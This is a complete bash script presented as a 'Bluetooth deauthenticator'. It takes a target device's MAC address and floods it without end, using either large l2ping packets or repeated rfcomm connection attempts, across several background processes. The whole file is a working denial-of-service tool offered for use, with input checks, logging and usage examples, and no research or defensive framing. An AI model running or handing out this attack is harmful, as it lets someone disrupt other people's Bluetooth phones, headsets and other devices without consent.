#!/bin/bash

version="v0.1.2-alpha"
target_addr="$1"
packet_size="$2"
attack_type="$3"

# Configuration
MAX_BG_PROCESSES=10
LOG_FILE="/tmp/blue_dos_$(date +%s).log"
PID_LIST=()

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging function
log_message() {
    local level="$1"
    shift
    local message="$@"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" | tee -a "$LOG_FILE"
}

# Cleanup function - gracefully shutdown
cleanup() {
    log_message "INFO" "Interrupt signal received. Shutting down gracefully..."
    
    # Kill all background processes
    for pid in "${PID_LIST[@]}"; do
        if kill -0 "$pid" 2>/dev/null; then
            log_message "INFO" "Terminating process $pid"
            kill "$pid" 2>/dev/null
        fi
    done
    
    log_message "INFO" "All processes terminated. Log saved to: $LOG_FILE"
    exit 0
}

# Check if running as root
check_root_privileges() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root${NC}"
        log_message "ERROR" "Insufficient privileges - root required"
        exit 1
    fi
}

# Validate MAC address format
validate_mac_address() {
    local mac="$1"
    if ! [[ $mac =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
        echo -e "${RED}[!] Invalid MAC address format: $mac${NC}"
        echo -e "${YELLOW}[i] Expected format: XX:XX:XX:XX:XX:XX${NC}"
        log_message "ERROR" "Invalid MAC address: $mac"
        exit 1
    fi
}

# Validate packet size
validate_packet_size() {
    local size="$1"
    if ! [[ "$size" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Packet size must be a positive integer${NC}"
        log_message "ERROR" "Invalid packet size: $size"
        exit 1
    fi
    if (( size <= 0 || size > 65535 )); then
        echo -e "${RED}[!] Packet size must be between 1 and 65535${NC}"
        log_message "ERROR" "Packet size out of range: $size"
        exit 1
    fi
}

# Check if required tools are installed
check_dependencies() {
    local tools=("l2ping" "rfcomm")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] Required tool not found: $tool${NC}"
            echo -e "${YELLOW}[i] Install bluez package: apt-get install bluez${NC}"
            log_message "ERROR" "Missing dependency: $tool"
            exit 1
        fi
    done
}

# Check if hci0 adapter exists and is available
check_hci_adapter() {
    if ! hciconfig hci0 &> /dev/null; then
        echo -e "${RED}[!] Bluetooth adapter hci0 not found or not available${NC}"
        echo -e "${YELLOW}[i] Available adapters:${NC}"
        hciconfig 2>/dev/null || echo "No adapters found"
        log_message "ERROR" "Bluetooth adapter hci0 not available"
        exit 1
    fi
}

# Limit concurrent background processes
limit_processes() {
    local active_processes=0
    
    # Count and clean up dead processes
    for i in "${!PID_LIST[@]}"; do
        if ! kill -0 "${PID_LIST[$i]}" 2>/dev/null; then
            unset 'PID_LIST[$i]'
        else
            ((active_processes++))
        fi
    done
    
    # Wait if we've hit the limit
    while (( active_processes >= MAX_BG_PROCESSES )); do
        sleep 0.1
        active_processes=0
        for pid in "${PID_LIST[@]}"; do
            if kill -0 "$pid" 2>/dev/null; then
                ((active_processes++))
            fi
        done
    done
}

# Display usage information
show_usage() {
    echo -e "${GREEN}Bluetooth deauthenticator $version${NC}"
    echo -e "\n${YELLOW}Attack types:${NC}"
    echo -e "\t${GREEN}1.)${NC} l2ping - Ping flood (continuous ping packets)"
    echo -e "\t${GREEN}2.)${NC} rfcomm - Connect flood (repeated connection attempts)\n"
    echo -e "${YELLOW}Usage:${NC} $0 <target_addr> <packet_size> <attack_type>"
    echo -e "\n${YELLOW}Examples:${NC}"
    echo -e "\tsudo $0 FC:58:FA:XX:XX:XX 600 1"
    echo -e "\tsudo $0 FC:58:FA:XX:XX:XX 600 2"
    echo -e "\n${YELLOW}Log file:${NC} $LOG_FILE\n"
}

# Main execution
main() {
    # Set up signal handlers for graceful shutdown
    trap cleanup SIGINT SIGTERM EXIT
    
    echo -e "${GREEN}Bluetooth deauthenticator $version${NC}"
    
    # Input validation
    if [[ $# != 3 ]]; then
        show_usage
        exit 0
    fi
    
    # Pre-flight checks
    log_message "INFO" "Starting pre-flight checks..."
    check_root_privileges
    check_dependencies
    check_hci_adapter
    validate_mac_address "$target_addr"
    validate_packet_size "$packet_size"
    
    log_message "INFO" "All checks passed. Starting attack."
    log_message "INFO" "Target: $target_addr | Packet Size: $packet_size | Attack Type: $attack_type"
    
    # Validate and set attack command
    case "$attack_type" in
        1)
            cmd="l2ping -i hci0 -s $packet_size -f $target_addr"
            attack_name="l2ping (Ping Flood)"
            log_message "INFO" "Using attack type 1: $attack_name"
            ;;
        2)
            cmd="rfcomm connect $target_addr 1 2>&1 >/dev/null"
            attack_name="rfcomm (Connect Flood)"
            log_message "INFO" "Using attack type 2: $attack_name"
            ;;
        *)
            echo -e "${RED}[!] Invalid attack type: $attack_type${NC}"
            show_usage
            log_message "ERROR" "Invalid attack type: $attack_type"
            exit 1
            ;;
    esac
    
    # Main attack loop
    echo -e "${GREEN}[+] Attack started. Press Ctrl+C to stop.${NC}"
    log_message "INFO" "Entering attack loop..."
    
    attack_count=0
    while true; do
        limit_processes
        
        # Execute command in background and track its PID
        eval "$cmd" &
        local pid=$!
        PID_LIST+=("$pid")
        
        ((attack_count++))
        echo -e "${GREEN}[+]${NC} Attack #$attack_count sent to $target_addr -- Packet size: $packet_size -- Type: $attack_name"
        log_message "INFO" "Attack #$attack_count sent (PID: $pid)"
        
        sleep 0.2
    done
}

# Run main function
main "$@"